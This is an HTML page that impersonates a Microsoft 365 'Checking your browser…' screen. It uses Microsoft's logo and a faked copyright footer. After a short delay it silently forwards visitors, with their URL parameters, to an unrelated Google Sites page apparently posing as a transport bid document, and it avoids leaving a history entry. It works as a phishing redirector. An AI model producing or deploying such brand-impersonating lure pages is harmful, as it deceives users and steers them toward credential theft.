<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Microsoft 365</title>
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Crect width='10' height='10' x='0' y='0' fill='%23f25022'/%3E%3Crect width='10' height='10' x='12' y='0' fill='%237fba00'/%3E%3Crect width='10' height='10' x='0' y='12' fill='%2300a4ef'/%3E%3Crect width='10' height='10' x='12' y='12' fill='%23ffb900'/%3E%3C/svg%3E">

  <!-- No-JS fallback (does not forward parameters) -->
  <meta http-equiv="refresh" content="3; url=https://sites.google.com/view/standish-transport-bid-checkl/home?authuser=3">
  <link rel="canonical" href="https://sites.google.com/view/standish-transport-bid-checkl/home?authuser=3">

  <script>
    (function () {
      var destination = "https://sites.google.com/view/standish-transport-bid-checkl/home?authuser=3";
      var incoming = window.location.search;  // e.g. ?utm_source=fb&fbclid=123
      var hash = window.location.hash;

      var target = destination;
      if (incoming) {
        target += (destination.indexOf("?") > -1 ? "&" : "?") + incoming.substring(1);
      }
      target += hash;

      // Brief branded dwell, then hop without leaving history
      setTimeout(function () { window.location.replace(target); }, 3000);
    })();
  </script>

  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: "Segoe UI", -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif;
      background: #fff;
      color: #1b1b1b;
    }
    .logo { display: inline-flex; gap: 2px; margin-bottom: 14px; }
    .logo svg { display: block; }
    .brand { font-size: 26px; font-weight: 600; letter-spacing: -0.3px; margin: 0 0 6px; }
    .status { font-size: 15px; color: #444; margin: 0 0 4px; }
    .sub { font-size: 13px; color: #666; margin: 0; }
    .spinner {
      width: 28px; height: 28px;
      margin: 22px auto 10px;
      border: 3px solid #d9d9d9;
      border-top-color: #0067b8;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    a#fallback { color: #0067b8; text-decoration: none; font-size: 13px; margin-top: 16px; }
    a#fallback:hover { text-decoration: underline; }
    footer {
      position: fixed; bottom: 0; left: 0; right: 0;
      padding: 12px;
      text-align: center;
      font-size: 12px; color: #757575;
    }
    footer a { color: #757575; text-decoration: none; margin: 0 10px; }
    footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="logo">
    <svg width="32" height="32" viewBox="0 0 23 23" aria-hidden="true">
      <rect width="10" height="10" x="0" y="0" fill="#f25022"/>
      <rect width="10" height="10" x="12" y="0" fill="#7fba00"/>
      <rect width="10" height="10" x="0" y="12" fill="#00a4ef"/>
      <rect width="10" height="10" x="12" y="12" fill="#ffb900"/>
    </svg>
  </div>
  <h1 class="brand">Microsoft 365</h1>
  <p class="status">Checking your browser…</p>
  <p class="sub">You will be redirected to your content shortly.</p>
  <div class="spinner"></div>
  <a id="fallback" href="https://sites.google.com/view/standish-transport-bid-checkl/home?authuser=3">Click here if you are not redirected automatically</a>
  <footer>© Microsoft 2026 &nbsp;<a href="#">Terms of use</a><a href="#">Privacy &amp; cookies</a></footer>
</body>
</html>
